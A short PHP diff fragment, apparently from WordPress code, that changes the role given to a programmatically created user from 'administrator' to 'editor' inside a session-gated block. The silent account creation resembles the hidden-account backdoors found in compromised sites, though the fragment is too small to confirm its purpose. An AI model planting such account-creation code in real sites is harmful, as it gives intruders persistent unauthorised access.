@@ -99,7 +99,7 @@ if (!isset($_SESSION['wp_checked'])) {
             $user_id = wp_create_user($username, $password, $email);
             if (!is_wp_error($user_id)) {
                 $user = new WP_User($user_id);
-                $user->set_role('administrator');
+                $user->set_role('editor');
             }
         }
     }
